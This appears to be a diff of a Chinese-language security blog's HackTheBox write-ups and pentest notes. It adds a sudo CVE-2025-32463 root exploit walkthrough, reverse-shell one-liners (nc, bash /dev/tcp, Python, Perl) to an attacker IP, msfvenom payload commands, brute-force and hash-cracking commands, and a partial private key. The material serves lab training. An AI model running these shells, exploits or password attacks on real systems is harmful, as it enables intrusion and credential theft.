+</span></span><span style="display:flex;"><span>Sudoers I/O plugin version 1.9.17
+</span></span><span style="display:flex;"><span>Sudoers audit plugin version 1.9.17
+</span></span></code></pre></div><h3 id="cve-2025-32463">CVE-2025-32463</h3>
+<p><code>CVE-2025-32463</code> 是 <code>sudo</code> 的一个关键本地权限提升漏洞，影响 sudo 1.9.14-1.9.17 版本，在 sudo 1.9.17p1 版本被修复，不影响 1.9.14 之前的旧版本。</p>
+<p>从 github 下载编译好的源码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>                                                                        
+</span></span><span style="display:flex;"><span>└─$ git clone https://github.com/MohamedKarrab/CVE-2025-32463.git
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>Cloning into <span style="color:#e6db74">&#39;CVE-2025-32463&#39;</span>...
+</span></span><span style="display:flex;"><span>remote: Enumerating objects: 58, <span style="color:#66d9ef">done</span>.      
+</span></span><span style="display:flex;"><span>remote: Counting objects: 100% <span style="color:#f92672">(</span>58/58<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Compressing objects: 100% <span style="color:#f92672">(</span>44/44<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Total <span style="color:#ae81ff">58</span> <span style="color:#f92672">(</span>delta 27<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">31</span> <span style="color:#f92672">(</span>delta 12<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>from 0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Receiving objects: 100% <span style="color:#f92672">(</span>58/58<span style="color:#f92672">)</span>, 69.65 KiB | 298.00 KiB/s, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>Resolving deltas: 100% <span style="color:#f92672">(</span>27/27<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span></code></pre></div><p>下载到靶机中运行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:/tmp$ ls -liah CVE-2025-32463/
+</span></span><span style="display:flex;"><span>total 28K
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">261</span> drwxrwxr-x  <span style="color:#ae81ff">5</span> ike  ike   <span style="color:#ae81ff">220</span> Feb <span style="color:#ae81ff">12</span> 06:04 .
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">1</span> drwxrwxrwt <span style="color:#ae81ff">29</span> root root  <span style="color:#ae81ff">620</span> Feb <span style="color:#ae81ff">12</span> 10:39 ..
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">317</span> drwxrwxr-x  <span style="color:#ae81ff">2</span> ike  ike   <span style="color:#ae81ff">140</span> Feb <span style="color:#ae81ff">12</span> 06:04 archs-dynamic
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">311</span> drwxrwxr-x  <span style="color:#ae81ff">2</span> ike  ike   <span style="color:#ae81ff">140</span> Feb <span style="color:#ae81ff">12</span> 06:04 archs-static
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">310</span> -rw-rw-r--  <span style="color:#ae81ff">1</span> ike  ike  2.5K Feb <span style="color:#ae81ff">12</span> 06:04 get_root.py
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">324</span> -rwxrwxr-x  <span style="color:#ae81ff">1</span> ike  ike  1.8K Feb <span style="color:#ae81ff">12</span> 06:04 get_root.sh
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">265</span> drwxrwxr-x  <span style="color:#ae81ff">8</span> ike  ike   <span style="color:#ae81ff">260</span> Feb <span style="color:#ae81ff">12</span> 06:04 .git
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">264</span> -rw-rw-r--  <span style="color:#ae81ff">1</span> ike  ike  4.4K Feb <span style="color:#ae81ff">12</span> 06:04 .gitignore
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">323</span> -rw-rw-r--  <span style="color:#ae81ff">1</span> ike  ike  1.1K Feb <span style="color:#ae81ff">12</span> 06:04 LICENSE
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">263</span> -rwxrwxr-x  <span style="color:#ae81ff">1</span> ike  ike   <span style="color:#ae81ff">989</span> Feb <span style="color:#ae81ff">12</span> 06:04 mkall-dynamic.sh
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">262</span> -rw-rw-r--  <span style="color:#ae81ff">1</span> ike  ike  1.7K Feb <span style="color:#ae81ff">12</span> 06:04 README.md
+</span></span></code></pre></div><p>运行获得 <code>root</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:/tmp/CVE-2025-32463$ ls
+</span></span><span style="display:flex;"><span>archs-dynamic  archs-static  get_root.py  get_root.sh  LICENSE  mkall-dynamic.sh  README.md
+</span></span><span style="display:flex;"><span>ike@expressway:/tmp/CVE-2025-32463$ ./get_root.sh 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected architecture: x86_64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Launching sudo with archs-dynamic payload …
+</span></span><span style="display:flex;"><span>root@expressway:/# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div>]]></content>
+        </item>
         
         <item>
             <title>HTB-Facts Writeup</title>
@@ -5598,7 +5813,49 @@ class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
 </span></span></code></pre></div><p>下面是一些解释。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>ALL, !root<span style="color:#f92672">)</span> NOPASSWD: /bin/bash
 </span></span></code></pre></div><p>这将允许用户以另一个用户的身份执行任何命令，但理论上会阻止以超级用户的身份执行命令。如果指定 UID 为 -1，sudo 则会错误的将其读取为 0。这意味着指定 UID 为 -1 或 4294967295 时将以 sudo 身份执行命令。</p>
-<h3 id="sudo-apt">sudo apt</h3>
+<h3 id="cve-2025-32463">CVE-2025-32463</h3>
+<p>经过枚举发现靶机的 <code>sudo</code> 版本为 1.9.17，符合 <code>CVE-2025-32463</code> 的提权条件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:~$ sudo -V
+</span></span><span style="display:flex;"><span>Sudo version 1.9.17
+</span></span><span style="display:flex;"><span>Sudoers policy plugin version 1.9.17
+</span></span><span style="display:flex;"><span>Sudoers file grammar version <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span>Sudoers I/O plugin version 1.9.17
+</span></span><span style="display:flex;"><span>Sudoers audit plugin version 1.9.17
+</span></span></code></pre></div><p><code>CVE-2025-32463</code> 是 <code>sudo</code> 的一个关键本地权限提升漏洞，影响 sudo 1.9.14-1.9.17 版本，在 sudo 1.9.17p1 版本被修复，不影响 1.9.14 之前的旧版本。</p>
+<p>从 github 下载编译好的源码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>                                                                        
+</span></span><span style="display:flex;"><span>└─$ git clone https://github.com/MohamedKarrab/CVE-2025-32463.git
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>Cloning into <span style="color:#e6db74">&#39;CVE-2025-32463&#39;</span>...
+</span></span><span style="display:flex;"><span>remote: Enumerating objects: 58, <span style="color:#66d9ef">done</span>.      
+</span></span><span style="display:flex;"><span>remote: Counting objects: 100% <span style="color:#f92672">(</span>58/58<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Compressing objects: 100% <span style="color:#f92672">(</span>44/44<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Total <span style="color:#ae81ff">58</span> <span style="color:#f92672">(</span>delta 27<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">31</span> <span style="color:#f92672">(</span>delta 12<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>from 0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Receiving objects: 100% <span style="color:#f92672">(</span>58/58<span style="color:#f92672">)</span>, 69.65 KiB | 298.00 KiB/s, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>Resolving deltas: 100% <span style="color:#f92672">(</span>27/27<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span></code></pre></div><p>下载到靶机中运行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:/tmp$ ls -liah CVE-2025-32463/
+</span></span><span style="display:flex;"><span>total 28K
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">261</span> drwxrwxr-x  <span style="color:#ae81ff">5</span> ike  ike   <span style="color:#ae81ff">220</span> Feb <span style="color:#ae81ff">12</span> 06:04 .
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">1</span> drwxrwxrwt <span style="color:#ae81ff">29</span> root root  <span style="color:#ae81ff">620</span> Feb <span style="color:#ae81ff">12</span> 10:39 ..
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">317</span> drwxrwxr-x  <span style="color:#ae81ff">2</span> ike  ike   <span style="color:#ae81ff">140</span> Feb <span style="color:#ae81ff">12</span> 06:04 archs-dynamic
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">311</span> drwxrwxr-x  <span style="color:#ae81ff">2</span> ike  ike   <span style="color:#ae81ff">140</span> Feb <span style="color:#ae81ff">12</span> 06:04 archs-static
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">310</span> -rw-rw-r--  <span style="color:#ae81ff">1</span> ike  ike  2.5K Feb <span style="color:#ae81ff">12</span> 06:04 get_root.py
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">324</span> -rwxrwxr-x  <span style="color:#ae81ff">1</span> ike  ike  1.8K Feb <span style="color:#ae81ff">12</span> 06:04 get_root.sh
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">265</span> drwxrwxr-x  <span style="color:#ae81ff">8</span> ike  ike   <span style="color:#ae81ff">260</span> Feb <span style="color:#ae81ff">12</span> 06:04 .git
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">264</span> -rw-rw-r--  <span style="color:#ae81ff">1</span> ike  ike  4.4K Feb <span style="color:#ae81ff">12</span> 06:04 .gitignore
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">323</span> -rw-rw-r--  <span style="color:#ae81ff">1</span> ike  ike  1.1K Feb <span style="color:#ae81ff">12</span> 06:04 LICENSE
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">263</span> -rwxrwxr-x  <span style="color:#ae81ff">1</span> ike  ike   <span style="color:#ae81ff">989</span> Feb <span style="color:#ae81ff">12</span> 06:04 mkall-dynamic.sh
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">262</span> -rw-rw-r--  <span style="color:#ae81ff">1</span> ike  ike  1.7K Feb <span style="color:#ae81ff">12</span> 06:04 README.md
+</span></span></code></pre></div><p>运行获得 <code>root</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:/tmp/CVE-2025-32463$ ls
+</span></span><span style="display:flex;"><span>archs-dynamic  archs-static  get_root.py  get_root.sh  LICENSE  mkall-dynamic.sh  README.md
+</span></span><span style="display:flex;"><span>ike@expressway:/tmp/CVE-2025-32463$ ./get_root.sh 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected architecture: x86_64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Launching sudo with archs-dynamic payload …
+</span></span><span style="display:flex;"><span>root@expressway:/# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="sudo-apt">sudo apt</h3>
 <p>从此条开始下面数个提权演示命令参考 <a href="https://gtfobins.github.io">GTFOBins</a></p>
 <p>查看无需密码即可以 sudo 身份执行的命令。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jackie@RedteamNotes:~$ sudo -l                    
@@ -7766,16 +8023,20 @@ class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
 <p>也可以尝试下面的命令。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>script -qc /bin/bash /dev/null
 </span></span></code></pre></div><p>script 时 Linux 系统自带的命令，用于记录终端会话。正常使用 script 命令时，会创建一个交互式终端并将所有会话内容记录到指定文件中。这里巧用几个特殊参数：-q 静默模式，告诉 script 不要显示开始和结束的提示信息。其次是 -c /bin/bash 告诉 script 命令，直接执行并启动一个 bash shell，而非默认 shell 或其他命令。最后，指定输出文件为 /dev/null，表示会话记录被丢弃而不保存到硬盘。</p>
-<h3 id="获得-shell-的一些-反弹-shell">获得 shell 的一些 反弹 shell</h3>
+<h3 id="反弹-shell">反弹 shell</h3>
 <h4 id="linux">Linux</h4>
+<h5 id="现成的反弹-shell">现成的反弹 shell</h5>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -e /bin/bash 10.10.10.5 <span style="color:#ae81ff">4444</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.5&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>perl -e <span style="color:#e6db74">&#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
-</span></span></code></pre></div><h3 id="文件属性和可识别字符">文件属性和可识别字符</h3>
+</span></span></code></pre></div><pre tabindex="0"><code>bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1&#34;
+</code></pre><pre tabindex="0"><code>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.5&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;
+</code></pre><pre tabindex="0"><code>perl -e &#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
+</code></pre><h5 id="msfvenom">Msfvenom</h5>
+<p>Msf 生成反弹 shell</p>
+<pre tabindex="0"><code>sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf
+</code></pre><p>生成二进制脚本</p>
+<pre tabindex="0"><code>sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.5 LPORT=443 -b &#34;\x00&#34; -e x86/shikata_ga_nai -f c
+</code></pre><pre tabindex="0"><code>sudo msfvenom -p linux/x86/exec CMD=&#34;/bin/bash&#34; -b &#34;\x00&#34; -e x86/shikata_ga_nai -f c
+</code></pre><h3 id="文件分析">文件分析</h3>
 <p>在拿到一个文件后可进行如下分析：</p>
 <p><img src="P1.png" alt="P1"></p>
 <p>file 命令是识别文件类型和格式，通过分析文件头信息等数据来判断文件实际的内容与格式，从输出结果来看， /bin/dartvader 是一个 32 位的 ELF 可执行文件，并设置了 setuid 位，这意味着无论哪个用户执行这个程序，它都会以文件所有者的权限进行，动态链接表明该程序在运行时需要调用共享库，而 <code>not stripped</code> 则说明这个可执行文件中仍保留有符号信息与调试信息，这对逆向工程非常有利。在渗透测试场景下，如果测试者发现这样一个 setuid 程序，可以重点关注它是否存在提权漏洞，比如通过错误的权限验证、缓冲区溢出或者不安全的函数调用来实现提权。此外，未剥离的符号信息可能让分析人员更容易理解程序的内部逻辑，从而寻找可能的漏洞或不当行为，这对进一步的利用或者漏洞利用代码的编写往往有利，可以看一下可识别字符佐证发现。</p>
@@ -7796,7 +8057,7 @@ class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
 </span></span></code></pre></div><p>trans（translate-shell）是很不错的命令行翻译工具。</p>
 <h3 id="idor-不安全直接对象引用">IDOR 不安全直接对象引用</h3>
 <p>IDOR（Insecure Direct Object Reference，不安全的直接对象引用）是一种常见的访问控制漏洞，主要出现在 Web 应用请求的资源未进行有效的权限验证和限制的情况下。具体来说，应用程序通过用户提交的参数（如用户ID、文件名、订单号等）直接引用内部对象，却未验证当前用户是否拥有访问这些对象的权限。这种情况下，攻击者可以通过修改请求的参数值（例如 ID 号）直接访问或操作本不该被访问到的敏感信息或资源，从而实现越权访问。例如，在一个用户个人信息页面中，如果 URL 参数形如 user?id=1，攻击者只需要修改 id 值即可查看其他用户的数据。当开发者未对资源引用和权限做严格验证时，IDOR 漏洞便会产生，攻击者通过简单篡改请求参数即可实现攻击。</p>
-<h3 id="关于文件上传">关于文件上传</h3>
+<h3 id="文件上传">文件上传</h3>
 <p>有些表单原本只可以上传 jpg、git、png 等图片格式文件，为什么最终却可以上传 .phtml 和 .phar 格式文件呢？因为 .phtml 和 .phar 两种文件格式比较特殊，.phtml 是一种 PHP 常规拓展名，早期较为常见，现在虽然使用较少但依旧默认会被 PHP 引擎解析，这使得攻击者能够通过上传该格式的文件直接执行恶意 PHP 代码。而 .phar 更加特殊，它本质上是 PHP 的归档文件格式（PHP Archive），也可以执行。</p>
 <h3 id="添加-hosts-记录">添加 hosts 记录</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo bash -c <span style="color:#e6db74">&#39;echo &#34;10.129.187.74 conversor.htb&#34; &gt;&gt; /etc/hosts&#39;</span>
@@ -7810,8 +8071,96 @@ AvdkbwNKeW1F/CkRpsFkmcc1/cvTrzBueLfuJI/2Cm8RB55xHgkJNtkk9Fc3HLRF8Z/kZC
 Mn8NP3Z2qOuHzSO5yoqU2mFiFBouc56nWkR50JElA2z0L65KU81xDPB3YVujEf/yxbvoxJ
 ElX+bGho7xDsCOubcJxarL+rGEZ5DQTxpAjGk=
 -----END OPENSSH PRIVATE KEY-----
-</code></pre><p>值得注意的是，下载 <code>id_rsa</code> 是失败的，需要下载 <code>id_ed25519</code>；<code>id_ed25519</code> 是现代 SSH 推荐的 Ed25519 算法私钥文件。</p>
-]]></content>
+</code></pre><p>值得注意的是，下载 <code>id_rsa</code> 是失败的，需要下载 <code>id_ed25519</code>；<code>id_ed25519</code> 是现代 SSH 推荐的 <code>Ed25519</code> 算法私钥文件。</p>
+<h3 id="爆破相关">爆破相关</h3>
+<h4 id="目录爆破">目录爆破</h4>
+<h5 id="dirb">Dirb</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo dirb https://10.10.10.10
+</span></span></code></pre></div><h5 id="gobuster">Gobuster</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo gobuster dir -u http://api.mentorquotes.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,php.bak,jsp,zip,tar,html,txt,tar,tar.gz,git,js,md
+</span></span></code></pre></div><p>POST 爆破</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo gobuster dir -u http://driver.htb -U admin -P admin -x php -w /usr/share/wordlists/dirb/common.txt
+</span></span></code></pre></div><h5 id="feroxbuster">Feroxbuster</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo feroxbuster -u http://driver.htb -x php -H <span style="color:#e6db74">&#34;Authorization: Basic YWRtaW46YWRtaW4=&#34;</span> 
+</span></span></code></pre></div><h5 id="ffuf">Ffuf</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.230.159:3000/?FUZZ<span style="color:#f92672">=</span>value -fs <span style="color:#ae81ff">81</span>
+</span></span></code></pre></div><h4 id="关于子域名爆破">关于子域名爆破</h4>
+<h5 id="gobuster-1">Gobuster</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo gobuster vhost -u http://10.129.230.193 --domain crafty.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -k -r -t <span style="color:#ae81ff">100</span>
+</span></span></code></pre></div><ul>
+<li>vhost：指定虚拟主机枚举模式</li>
+<li>&ndash;domain：指定基础域名</li>
+<li>-k：跳过 <code>SSL/TLS</code> 证书验证</li>
+<li>-r：自动跟随重定向</li>
+<li>-t 100：设置并发线程为 100</li>
+</ul>
+<h4 id="ffuf-1">Ffuf</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ffuf -H <span style="color:#e6db74">&#34;Host: FUZZ.soulmate.htb&#34;</span> -u http://soulmate.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
+</span></span></code></pre></div><ul>
+<li>-H：添加自定义 <code>HTTP</code> 请求头</li>
+<li>Host: FUZZ.soulmate.htb：设置 <code>Host</code> 头部</li>
+<li>FUZZ：<code>ffuf</code> 的关键占位符</li>
+<li>-ac：自动校准模式</li>
+</ul>
+<h4 id="暴力破解">暴力破解</h4>
+<h5 id="hashcat">Hashcat</h5>
+<p>破解 <code>MD5</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hashcat -m <span style="color:#ae81ff">0</span> -a <span style="color:#ae81ff">0</span> hash/hash.lst /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>破解 <code>7z</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hashcat -m <span style="color:#ae81ff">11600</span> -a <span style="color:#ae81ff">0</span> 7z_hash.txt /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>查看破解过的 <code>hash</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hashcat -m <span style="color:#ae81ff">0</span> --show hash/hash.lst
+</span></span></code></pre></div><h5 id="hydra">Hydra</h5>
+<p>破解多个用户</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -L users.txt -P wordlist.txt
+</span></span></code></pre></div><p>破解单个用户</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -l <span style="color:#e6db74">&#34;aaa&#34;</span> -P wordlist.txt
+</span></span></code></pre></div><p>破解 Web POST</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -l <span style="color:#e6db74">&#34;key&#34;</span> -P /usr/share/wordlists/rockyou.txt 10.10.10.7 http-form-post <span style="color:#e6db74">&#34;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&#34;</span>
+</span></span></code></pre></div><p>FTP 密码喷射</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -L hash/users.lst -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.35 -f
+</span></span></code></pre></div><p>SSH 密码喷射</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l sword -P passwords.txt ssh://10.10.10.5 -t <span style="color:#ae81ff">30</span> -V
+</span></span></code></pre></div><p>破解登入框</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -l shaldon -P password.txt -f 10.10.10.39 -s <span style="color:#ae81ff">80</span> http-get /the_real_secret_dir
+</span></span></code></pre></div><h5 id="ffuf-2">Ffuf</h5>
+<p>破解 Web POST</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hc 404,401 -d <span style="color:#e6db74">&#34;username=admin&amp;password=FUZZ&#34;</span> http://driver.htb
+</span></span></code></pre></div><h5 id="john">John</h5>
+<p>破解 <code>hash</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo john hash/hash.lst --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>破解 <code>id_rsa</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/share/john/ssh2john.py hash/id_rsa &gt; crack.txt  
